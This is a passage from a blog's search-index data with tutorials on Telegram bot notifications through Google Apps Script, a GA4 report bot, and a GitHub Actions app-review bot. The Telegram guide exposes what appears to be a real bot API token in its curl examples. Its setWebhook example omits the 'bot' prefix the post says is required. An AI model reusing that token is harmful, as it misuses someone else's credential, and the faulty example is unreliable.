ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"51\" } ], \"dimensionValues\": [ { \"value\": \"Travelogue 9/11 Nagoya One-Day Flash Free Travel \\| ZhgChgLi\" } ] }, { \"metricValues\": [ { \"value\": \"42\" } ], \"dimensionValues\": [ { \"value\": \"iOS Privacy and Convenience: Past and Present \\| ZhgChgLi\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS Vision Framework x WWDC 24 Discover Swift Enhancements in the Vision Framework Session \\| ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"34\" } ] }, { \"dimensionValues\": [ { \"value\": \"iOS ‚â• 18 NSAttributedString Attributes Range Merging Behavior Change \\| ZhgChgLi\" } ], \"metricValues\": [ { \"value\": \"30\" } ] }, { \"metricValues\": [ { \"value\": \"30\" } ], \"dimensionValues\": [ { \"value\": \"The Story of Handcrafted HTML Parsers \\| ZhgChgLi\" } ] } ], \"metricHeaders\": [ { \"type\": \"TYPE_INTEGER\", \"name\": \"screenPageViews\" } ], \"totals\": [ { \"dimensionValues\": [ { \"value\": \"RESERVED_TOTAL\" } ], \"metricValues\": [ { \"value\": \"1229\" } ] } ]} Google Apps Script successfully requested GA data! üéâüéâüéâStep 3. Put It All Together! Google Apps Script + GA4 + Telegram BotAccording to the previous article ‚Äú10-minute quick transfer from Line Notify to Telegram Bot notification‚Äù, create your Telegram Bot to get the Bot Token &amp; the Channel Chat ID you want to send messages to.const telegramToken = \"XXXX\" // Insert your Telegram Bot Token//function execute() { const screenPageViewsReport = fetchScreenPageViews(\"318495208\"); // const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"Total Views: \"+total.toLocaleString()+\"\\n\"; screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \"+(index + 1)+\"] \"+pageTitle+\": \"+value.toLocaleString()+\"\\n\"; }); sendNotifyMessage(message, -xxxx); // Insert your Channel Chat ID}// Send message to specified Telegram Channel Chat IDfunction sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); const data = JSON.parse(response.getContentText()); if (data[\"ok\"] == undefined \\|\\| data[\"ok\"] != true) { if (data[\"error_code\"] != undefined &amp;&amp; data[\"error_code\"] == 429) { Utilities.sleep(1000); sendNotifyMessage(message, chatId); } }}function fetchScreenPageViews(propertyId, startDate = \"7daysAgo\", endDate = \"yesterday\") { const screenPageViewsMetric = AnalyticsData.newMetric(); screenPageViewsMetric.name = \"screenPageViews\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const pageTitleDimension = AnalyticsData.newDimension(); pageTitleDimension.name = \"pageTitle\"; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [pageTitleDimension]; request.metrics = [screenPageViewsMetric]; request.dateRanges = dateRange; request.limit = 10; request.metricAggregations = \"TOTAL\"; return AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId);}Code Analysis://... // Find the total position in the report's returned JSON, parseInt converts string to INT number format // .toLocaleString() -&gt; formats number, 123456 -&gt; 123,456 const total = parseInt(screenPageViewsReport.totals[0].metricValues[0].value); var message = \"Total views: \" + total.toLocaleString() + \"\\n\"; // Iterate through the report's returned JSON data to compose the message screenPageViewsReport.rows.forEach(function(element, index) { const pageTitle = element.dimensionValues[0].value; const value = parseInt(element.metricValues[0].value); message += \"[Top \" + (index + 1) + \"] \" + pageTitle + \": \" + value.toLocaleString() + \"\\n\"; });//...Execution: Click the ‚ÄúRun‚Äù or ‚ÄúDebug‚Äù button above and make sure the method name selected is execute: Success! üéâüéâüéâSet up scheduled automatic executionThe final step is to have the report bot run automatically on a schedule. Go to ‚ÄúTriggers‚Äù from the left menu: Select the ‚ÄúAdd Trigger‚Äù button at the bottom right corner Choose the function to execute: select the method name ‚Äúexecute‚Äù Select the deployment operation to execute: choose ‚ÄúTop‚Äù Select event source: choose ‚ÄúTime-driven‚Äù Select Time-Based Trigger Type: choose your desired trigger frequency Select Time Slot: choose the time you want the daily automatic trigger to occur If Execution Fails‚Ä¶ Notification Email Frequency Settings Save Done! Now it will run automatically when the time comes. üéâüéâüéâExtended ExercisesOther data such as new users and source mediums can also be obtained using the previous code, so it won‚Äôt be repeated here. Consider it as homework for everyone.If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Line Notify to Telegram Bot MigrationÔΩúFast 10-Minute Guide for Enhanced Notifications", "url": "/posts/zrealm-robotic-process-automation/line-notify-to-telegram-bot-migration-fast-10-minute-guide-for-enhanced-notifications-6922e90ba90c/", "categories": "ZRealm Robotic Process Automation", "tags": "english, ai-translation, ios-app-development, line, telegram, google-apps-script, automation", "date": "2024-10-12 21:10:46 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!10-Minute Quick Transfer from Line Notify to Telegram Bot NotificationsStep-by...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!10-Minute Quick Transfer from Line Notify to Telegram Bot NotificationsStep-by-Step Guide to Migrate Line Notify Personal Notification Service to the Also Free and More Powerful Telegram BotPhoto by Lana CodesLINE Notify Service Termination Announcement Thank you for using LINE Notify for a long time. Since its launch in September 2016, LINE Notify has been dedicated to serving developers. To provide better services and focus resources on similar future products, we have decided to end this service on March 31, 2025. We sincerely thank all users who have supported and used LINE as a notification integration service over the years. If you still need to use LINE to send notifications to users, it is recommended to switch to the more feature-rich Messaging API.Excerpted from Line Notify Official Website, Line announced on 2024/10/08 that Line Notify will be completely shut down on 2025/04/01. To continue using Line for message notifications, only the paid Message API can be used.The advantage of Line Notify is that it is very easy to integrate, making it convenient and useful for personal notification bots. Some Line Bots or third-party services also use Line Notify for notifications (e.g., Louisa, your order notification feature). However, it has several drawbacks, such as limited message content, no group segmentation (all messages are sent to the Line Notify Bot), and message length restrictions, among others.With Line Notify announcing its termination, it also gave me an opportunity to migrate to other communication and notification services: Slack: The free version only keeps messages for 30 days. My notifications are more personal, so using Slack feels a bit like overkill. (For sending messages with Slack, refer to my previous article: Slack &amp; ChatGPT Integration) Discord: My notifications are more personal, which feels a bit like overkill. Telegram: Free, almost unlimited use. For me, Telegram‚Äôs messaging service better meets my original Line Notify usage needs. I need a channel that can receive notifications, preferably with different channels for different needs. The more diverse the acceptable content and formats, the better, and it should be easy and quick to integrate. Telegram meets all these requirements and also supports interactive features with bots.ResultsFirst, here is the final result image (using Github Star notification, Repo Stats notification as examples): ‚úÖ When someone stars the Repo, it triggers a Webhook -&gt; Google Apps Script -&gt; Telegram Bot to send a notification to Telegram ‚Äî Github Stats Group ‚úÖ Google Apps Script Daily Schedule -&gt; Fetch Github Repo Stats -&gt; Telegram Bot Sends Notification to Telegram ‚Äî Github Stats Group ‚úÖ Use the /update Telegram Bot Command to trigger fetching Github Repo Stats status -&gt; Telegram Bot sends notification to Telegram ‚Äî Github Stats Group Compared to the original Line Notify ‚ùå All messages that cannot be categorized or grouped are sent to Line Notify ‚ùå Cannot set special settings for individual messages (such as notification sound, mute‚Ä¶) ‚ùå Unable to input messages for interaction Table of Contents Setting up a Telegram Bot Migrating Line Notify Message Sending to Telegram Bot (Google Apps Script) Interacting with Telegram Bot (Commands) using Google Apps Script (1/2) Setting up Telegram BotApplying for a Telegram Bot is very simple; you don‚Äôt even need to open a webpage. Just interact with the official BotFather bot.Step 1. Apply for a Telegram BotAfter installing and registering for the Telegram service, click to add BotFather bot as a friend. Open and join BotFather bot After joining, send the message ‚Äú/newbot‚Äù to create your bot. Enter your bot name Enter your bot username (must be unique and end with bot, for example, mine is zhgchgli_bot) Your bot link, click to start using (e.g. t.me/harrytest56_bot) Get your BOT_API_Token, please keep it safe ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Click the link obtained in step 4 to start using the Bot:Currently, there are no features available. You can tap the top right corner Info to edit your name or upload a profile picture.Step 2. Create a Telegram Notification Group &amp; Add the Bot Account I want different types of personal notifications to be sent to different Groups, but here only one My Notify Group is created for the Demo. You can create different Groups based on actual needs and add or configure bots step by step. New Group Search for your bot account &amp; click Join Set Group Name and Avatar Step 3. Obtain Group Chat IDTelegram Bot API does not provide a direct endpoint to get the list of Groups or Group Chat IDs. You can only obtain the bot‚Äôs message list through /getUpdates and extract the Group Chat IDs from there:Request:curl 'https://api.telegram.org/bot‰Ω†ÁöÑ_BOT_API_Token/getUpdates' The Telegram API format is https://api.telegram.org/bot your_BOT_API_Token /getUpdates. The BOT API Token string must be prefixed with the bot string. Example: curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/getUpdates' Response:{ \"ok\": true, \"result\": [ { \"update_id\": 706454235, \"my_chat_member\": { \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": false }, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"date\": 1728726861, \"old_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"left\" }, \"new_chat_member\": { \"user\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"status\": \"member\" } } }, { \"update_id\": 706454236, \"message\": { \"message_id\": 1, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726861, \"group_chat_created\": true } }, { \"update_id\": 706454237, \"message\": { \"message_id\": 2, \"from\": { \"id\": 986128250, \"is_bot\": false, \"first_name\": \"Harry\", \"last_name\": \"Li\", \"username\": \"zhgchgli\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728726864, \"new_chat_photo\": [ { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANhAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQAAQ\", \"file_size\": 5922, \"width\": 160, \"height\": 160 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANiAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFRn\", \"file_size\": 15097, \"width\": 320, \"height\": 320 }, { \"file_id\": \"AgACAgUAAxkBAAMCZwpHUEaLZSvFFYu8GiO-8qI_jVYAApfAMRu0B1BUJP-4u2wF6scBAAMCAANjAAM2BA\", \"file_unique_id\": \"AQADl8AxG7QHUFQB\", \"file_size\": 37988, \"width\": 640, \"height\": 640 } ] } } ]}You can find the corresponding nested JSON data for Group Name + type=group in the response, where the id is the Group Chat ID:\"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": false} Group Chat Id = -4532420331 ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èÔ∏è If your response is empty { \"ok\": true, \"result\": [] }, please try sending a message in your group (e.g. Hello) and then call the API again. It should work.Step 4. Send MessageWe can use /sendMessage to send messages to a Group.Request:curl 'https://api.telegram.org/bot‰Ω†ÁöÑ_BOT_API_Token/sendMessage' \\--form 'chat_id=\"Group Chat Id\"' \\--form 'text=\"Message content\"'Example:curl 'https://api.telegram.org/bot7814194578:AAEWpPJvKn06ID7D9FjV65aDKQLkGkz8cc8/sendMessage' \\--form 'chat_id=\"-4532420331\"' \\--form 'text=\"test\"' API parameters can be found in the official documentationResponse &amp; Result:{ \"ok\": true, \"result\": { \"message_id\": 5, \"from\": { \"id\": 7814194578, \"is_bot\": true, \"first_name\": \"Harry Test\", \"username\": \"harrytest56_bot\" }, \"chat\": { \"id\": -4532420331, \"title\": \"My Nofify\", \"type\": \"group\", \"all_members_are_administrators\": true }, \"date\": 1728727847, \"text\": \"test\" }} Sent successfully and received the above response Replying in the Telegram Group will display the message content just sent.(2/2) Migrate Line Notify Message Sending to Telegram Bot (Google Apps Script)My personal notification bot service is implemented using Google Apps Script, so I will use Google Apps Script (JavaScript-like) as an example for conversion.Original Line Notify Sending Code:const lineToken = \"XXXX\";function sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}You can see it is very simple, convenient, and easy to use‚Ä¶Code for migrating to a Telegram Bot:const telegramToken = \"your_BOT_API_Token\";const TelegramChatId = { GA: -123456, GITHUB: -123457, MEDIUM: -123458};function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());}Information obtained from the previous Telegram Bot setup steps. telegramToken = your_BOT_API_Token TelegramChatId here is a custom method I defined because, in practice, I want different notifications to be sent to different groups. Therefore, I created a structure to manage target groups and their Group Chat Id. /sendMessage API parameters, for more parameters and details please refer to the official documentation, below are the parameters I commonly use: text: Message content (required) chat_id: Target Group Chat Id (required) parse_mode: Message content parsing method, here I specify Markdown disable_web_page_preview: Whether to disable link previews in the message content. Setting this to true here will turn off previews, making the message display simpler. Usage:sendNotifyMessage(\"Hello\", TelegramChatId.MEDIUM) // Send Hello message to MEDIUM Group Chat IdsendNotifyMessage(\"Hello\", -1234) // Send Hello message to -1234 Group Chat IdResultsUsing my Github Repo Star Notifier bot as an example: Verification successful! When someone stars my Repo, the notification is correctly sent to the Telegram Group! üéâüéâüéâ For the setup, you can refer to my previous article ‚ÄúUsing Google Apps Script in Three Steps to Create a Free Github Repo Star Notifier‚Äù Set Custom Sounds or MuteEven better than Line Notify is that we can set different notification sounds or mute options for different groups.Interacting with Telegram Bot (Command) x Using Google Apps ScriptBesides replacing the Notify function, Telegram Bot can also easily implement user interaction features ‚Äî Telegram Bot Command.Back to my use case, my bot sends notification messages to me either on a schedule or triggered by a Webhook; but sometimes I want to manually trigger the bot to get the current result immediately. Previously, Line Notify did not have this feature. With Google Apps Script, the only option was to forcibly set up a URL that triggers the bot whenever opened, which is not user-friendly.Telegram Bot Command lets me directly enter command messages and have the bot immediately perform the tasks I want. This article uses Google Apps Script as an example. For a detailed introduction to Google Apps Script, please refer to my previous article ‚ÄúUsing Google Apps Script to Achieve Google Services RPA Automation‚Äù.Step 1. Implement Command Handling Logic Using Google Apps Script Go to the Google Apps Script homepage Top left ‚ÄúCreate New Project‚Äù Click ‚ÄúUntitled Project‚Äù to enter the project name, e.g. Telegram Paste the basic code: const telegramToken = \"your_BOT_API_Token\";function doPost(e) { const content = JSON.parse(e.postData.contents); if (content.message &amp;&amp; content.message.text) { const command = content.message.text.split(' ')[0]; const chatId = content.message.chat.id; if (command.startsWith(\"/update\")) { // Received /update command // Handle your tasks here... then respond... sendNotifyMessage(\"Hello.....\\nCommand:\"+command, chatId); } } return HtmlService.createHtmlOutput(\"OK!\");}function sendNotifyMessage(message, chatId) { var url = \"https://api.telegram.org/bot\"+telegramToken+\"/sendMessage\"; const payload = { \"chat_id\": chatId, \"text\": message, \"disable_web_page_preview\": true, \"parse_mode\": \"Markdown\" } const options = { 'method': 'post', 'contentType': 'application/json', 'muteHttpExceptions': true, 'payload': JSON.stringify(payload) }; const response = UrlFetchApp.fetch(url, options); Logger.log(response.getContentText());} telegramToken = your_BOT_API_Token In the demo program above, when receiving a POST request with the Command parameter set to /update, it responds with ‰Ω†Â•Ω‚Ä¶ to simulate processing and replying after receiving the command. Step 2. Complete Google Apps Script Web Deployment Top right corner ‚ÄúDeploy‚Äù -&gt; ‚ÄúAdd Deployment Task‚Äù Top left corner ‚ÄúSettings‚Äù -&gt; ‚ÄúWeb Applications‚Äù Who can access if ‚ÄúEveryone‚Äù is selected? Add a deployment task and select ‚ÄúGrant Access‚Äù Exit the account window and select your Google login account A warning window will pop up. Select ‚ÄúAdvanced‚Äù -&gt; ‚ÄúGo to Project Name (unsafe)‚Äù Select ‚ÄúAllow‚Äù Web application URL: Your Webhook URL .Copy it.e.g. https://script.google.com/macros/s/AKfycbx2oFv-eB4LezdOk3P3aoEZVhx_PI6n_YnTNP7WVVQSaiRU52di5bKNThsvIZxus3Si/exec For deploying, updating, using, and debugging Google Apps Script web applications, please refer to my previous article ‚ÄúAutomating Google Services with Google Apps Script RPA‚Äù. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Please note, if the Google Apps Script code changes, you must click Deploy -&gt; Manage Deployments -&gt; Select Create New Version for the changes to take effect. For details, please refer to the article above. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èPlease note, if the Google Apps Script code is changed, you must click Deploy -&gt; Manage Deployments -&gt; Select Create New Version for the changes to take effect. For details, please refer to the article above. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èPlease note, if the Google Apps Script code is changed, you must click Deploy -&gt; Manage Deployments -&gt; Select Create New Version for the changes to take effect. For details, refer to the article above.Step 3. Register WebhookUse the Telegram API /setWebhook to register your Webhook URL.Request:curl --location 'https://api.telegram.org/‰Ω†ÁöÑ_BOT_API_Token/setWebhook' \\--form 'url=\"Your Webhook URL\"'Response:{ \"ok\": true, \"result\": true, \"description\": \"Webhook was set\"}Test We respond based on different Chat IDs, so we can reply whether it‚Äôs a 1:1 chat with the bot or a group chat that includes the bot. Success üéâüéâüéâ Next: Simple 3 Steps ‚Äî Build a Free GA4 Automated Data Notification BotOther Google Apps Script Automation Articles Automate Google Services with Google Apps Script RPA Slack &amp; ChatGPT Integration Using Google Apps Script to Create a Free Github Repo Star Notifier in Three Steps NotesThis is also my 100th article on Medium (first published in October 2018 first article, 6 years ago). I will keep persevering and working hard. I will share detailed insights and data once I reach 1,000 followers (currently 925 as of October 2024) or 1,000,000 total views (currently 984,549 as of October 2024).If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "GitHub ActionsÔΩúDeploy Free App Review Monitoring Bot in 3 Steps", "url": "/posts/zrealm-robotic-process-automation/github-actions-deploy-free-app-review-monitoring-bot-in-3-steps-0095528cf875/", "categories": "ZRealm Robotic Process Automation", "tags": "ios-app-development, app-review, app-store, google-play, android, english, ai-translation", "date": "2024-09-26 20:42:21 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Quick Start!] Github Action x ZReviewTender Free and Fast Deployment of Your ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Quick Start!] Github Action x ZReviewTender Free and Fast Deployment of Your App Store Review Monitoring BotThree Simple Steps to Create a Free, Stable, and Secure App Review Bot to Instantly Monitor Users‚Äô Latest Reviews.ZReviewTender [English Version] : [Quick Start! ] Github Action x ZReviewTender Free and Fast Deployment of Your App Store Review Monitoring BotZReviewTenderZReviewTender ‚Äî is an open-source App store review bot I created in August 2022. It automatically fetches user reviews from the iOS App Store and Android Google Play stores and forwards them to a designated Slack channel.You can also specify review fetching rules, integrate with Google Translate, Asana, Google Sheets, and support custom operations.Github ActionGithub Action is a CI/CD automation tool provided by Github. We can use our own machines as servers (Github Runner) or directly use machines provided by Github to run CI/CD and automation scripts.Costs and Limitations Use Your Own Machine (Github Runner) Using GitHub-provided runners: GitHub Free provides basic 500 MB Storage (for CI/CD Artifacts) and 2,000 minutes of execution time per month.Note here is due to machine cost issues: If using Github‚Äôs Windows machines, the consumed minutes equal the actual minutes multiplied by 2. If you use Github‚Äôs macOS machines, the consumed minutes equal the actual minutes multiplied by 10. For detailed pricing calculations, please refer to the official pricing calculator. ZReviewTender Approximate monthly usage: 120 minutes Only needs to run on basic priced Linux, each execution takes ‚â§ 1 minute, default runs every 6 hours, spending 4 minutes per day, about 120 minutes per month, well within the free tier. ZReviewTender _Storage usage: 0* No use of Artifact to store data, so there is no Storage cost.SlackThe company‚Äôs internal communication software will create a Slack App and use this Slack App identity to forward App Store review notifications to a specified channel.ZReviewTender x Github Action x Slack We use Github Action to run the ZReviewTender script and forward results to Slack. The Github Repo (Action) is only used as a carrier, so even if your main project is not hosted on Github, you can still easily deploy ZReviewTender by following the steps below. üéâüéâüéâ I have successfully deployed it on different Apps from 5 different companies, running stably and free of charge for over 2 years.Advantages: Free: ZReviewTender is a free and open-source service I created, deployed on Github Action using the free tier, which is more than sufficient.You don‚Äôt need to pay monthly fees for App Review Bot or similar review monitoring services. Security: The credentials and keys used to fetch reviews are securely stored in your Github Private Repo, and only you have access.You no longer need to risk leaking important credentials or keys by uploading them to third-party services; ZReviewTender is open-source, and all operations are open to public review. Reliable: ZReviewTender uses the latest official APIs to fetch review data. Compared to other services using RSS feeds, it is more accurate, stable, and reliable. Buy me coffee ‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏èhttps://www.paypal.com/ncp/payment/CMALMPT8UUTY2 If this project has helped you, please consider buying me a coffee. Thank you.Quick Start!üöÄ The entire setup takes about 30 minutes but only needs to be done once. Unless the credential keys are changed, it can run permanently for free and stably. üöÄüöÄüöÄüöÄüöÄStep 1. Create a Slack AppIf your organization already has a Slack App with message-sending permissions like chat:write, you can reuse it directly without creating a new one.Go to Slack Apps homepage:https://api.slack.com/appsClick the ‚ÄúCreate New App‚Äù button at the top right corner. Choose: From scratch Enter App Name: ZReviewTender or a custom Slack App name Select the target Slack Workspace for installation: Please make sure you have permission to add a Slack App to the Workspace you choose. Create App Add OAuth &amp; Permissions Scopes:After creating the Slack app, go to the ‚ÄúOAuth &amp; Permissions‚Äù tab to set the Scopes. Select ‚ÄúOAuth &amp; Permissions‚Äù Scroll down to find the Scopes Section Enter the three required scopes for adding the ZReviewTender Slack App in order: chat:writechat:write.publiclinks:writeInstall AppGo back to the Install App tab to install the Slack App into your Workspace. Select ‚ÄúInstall App‚Äù Click ‚ÄúInstall to YOUR_WORKSPACE‚Äù Click ‚ÄúAllow‚Äù After installation, return to the Install App page where the Slack App Bot User OAuth Token will appear. Click ‚ÄúCopy‚Äù to copy it, make sure to save it for later use.Create a Channel to Receive Review Notifications: Sidebar -&gt; Channels -&gt; Create -&gt; Create channel Name: Enter the desired channel name Visibility: Public: Open to everyone, no further action required. Private: Private channel, ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è You need to add the newly created Slack App: How to Add Slack App to a Channel: Click the #channel name above Click ‚ÄúSettings‚Äù Click ‚ÄúAdd an App‚Äù Search for the Slack App name you just created Click ‚ÄúAdd‚Äù A prompt message will appear upon successfully joining the channel: ZReviewTender joined. ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏èThere is a Slack bug here: a newly created Slack App may not be found immediately and might take some time to appear; you can use a Public Channel first, as Public Channels can be used without adding the Slack App.Get Channel ID:The final and most important step is to obtain the Channel ID for later configuration. Click the #channel name above At the bottom, there is Channel ID information. Note down the Channel ID for later configuration Slack steps completed.‚Äî ‚Äî ‚ÄîOther Notes:You can edit the Slack App name and icon in ‚ÄúBasic Information‚Äù -&gt; ‚ÄúDisplay Information‚Äù:Remember to click ‚ÄúSave Changes‚Äù at the bottom right to save your modifications.If OAuth &amp; Permissions Scopes are updated, you need to click ‚Äúreinstall your app‚Äù to apply the changes:Step 2. Generate Apple App Store Connect API &amp; Google Play Android Developer API CredentialsApple App Store Connect API CredentialsiOS is easier; we only need to get the following four pieces of information from App Store Connect:Issuer ID: App Store Connect -&gt; Keys -&gt; App Store Connect API Note down the Issuer ID for later configuration Private Key ID &amp; Private KeyÔºöClick the ‚Äú+‚Äù Add Button: Name: ZReviewTender Access: App Manager Key ID , to be used later for configuration Click ‚ÄúDownload API Key‚Äù to save the downloaded AuthKey_XXXXXXXXXX.p8 file for later configuration. App ID : (The target App ID to fetch reviews)The App ID can be found in App Store Connect -&gt; App Store -&gt; General -&gt; App Information -&gt; App ID. Note down the App ID for later configurationGoogle Play Android Developer API CredentialsAndroid is more complex. You need to first enable the API in the Google Cloud Project associated with the app, create a Service Account, and add the Service Account to the Google Play Console with app permissions.Go to Google Cloud Project:Select the Google Cloud Project associated with your App project or create a new Project.Enable ‚ÄúAndroid Developer API‚Äù: Search for ‚ÄúAndroid Developer API‚Äù and click to enter Select ‚ÄúEnable‚Äù [Optional Step] You can also enable the ‚ÄúCloud Translation API‚Äù: After enabling, you can use the same Service Account credentials to connect the automatic review translation feature. Note: The Cloud Translation API is not free; language detection and translation will incur charges! Note: The Cloud Translation API is not free; language detection and translation will incur charges! Note: The Cloud Translation API is not free; language detection and translation will incur charges! Create Service Account: Search for ‚ÄúIAM‚Äù Select ‚ÄúIAM &amp; Admin‚Äù Select ‚ÄúService Account‚Äù Select ‚ÄúCreate Service Account‚Äù Service Account Name: Enter your own name, such as ZReviewTender or Google Play Review Bot Service Account ID: Automatically filled in; no need to change unless special requirements. This will also be your Service Account Email. Click ‚ÄúDone‚Äù Note down the email address of this Service Account: The list page will also display the Service Account Email address Note down the Service Account Email for later configuration Create Service Account Key Credentials: Refresh the list page, then click to enter the newly created Service Account. Click ‚ÄúAdd Key‚Äù Click ‚ÄúCreate a new key‚Äù Select the key type as ‚ÄúJSON‚Äù Click ‚ÄúCreate‚Äù Save the downloaded XXXX-XXXX.json file for later configuration Add the service account to Google Play Console and grant permissions to the target app for fetching reviews:Enter the Google Play Console backend: Click ‚ÄúUsers and permissions‚Äù Click ‚ÄúInvite new users‚Äù on the right side Enter the Service Account Email you just noted in the Email address field App permissions -&gt; Add app Add the target App to fetch reviews from Click ‚ÄúInvite user‚Äù to complete the invitation without verification. Get Google Play Console Developer ID &amp; App ID &amp; Package Name Information: Click the target App to fetch reviews and enter the Dashboard Note down the Package Name for later configuration Copy the Dashboard URL and find from the URL: Among them, /developers/ XXX is your Developer ID. Note down this number for later configuration Among them, /app/ XXX is your App ID , remember this App ID number for later setup Credential setup completed.Step 3. Github Action Deployment and Configuration File SetupThe exciting news is that I have packaged the complex Github Repo and Github Action setup into a Repo Template &amp; Marketplace Github Action. You can complete the work by following these simple steps.Go to: ZReviewTender-deploy-with-github-action Ôºöhttps://github.com/ZhgChgLi/ZReviewTender-deploy-with-github-action Repository name: Enter the desired Repo name Private: Since the Repo will store access keys, be sure to set it as a Private Repo ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è Private: Since the Repo will store access keys, be sure to set it as a Private Repo ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è Private: Since the repo will store access keys, be sure to set it as a Private Repo ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è Click ‚ÄúCreate repository‚Äù The author and contributors of ZReviewTender, ZhgChgLi, are not responsible for any losses caused by your use of ZReviewTender.Waiting for Repository Creation:Confirm again that the repository created is Private: Private: Since the repo will store access keys, be sure to set it as a Private Repo ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è Private: Since the repo will store access keys, be sure to set it as a Private Repo ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è Private: Since the Repo will store access keys, be sure to set it as a Private Repo ‚≠êÔ∏è‚≠êÔ∏è‚≠êÔ∏è Enable Github Actions Permissions:After creating the repo, due to Github security settings, you need to go to Repo Settings to allow Github Actions to run. Repo -&gt; Settings Select ‚ÄúActions‚Äù -&gt; ‚ÄúGeneral‚Äù Set Actions permissions to ‚ÄúAllow all actions and reusable workflows‚Äù Click ‚ÄúSave‚Äù Set Workflow permissions to ‚ÄúRead repository contents and packages permissions‚Äù First Run, Initialize ZReviewTender: Repo -&gt; Actions Select ‚ÄúInit ZReviewTender‚Äù Select ‚ÄúRun workflow‚Äù Click ‚ÄúRun workflow‚Äù Refresh the page Wait for 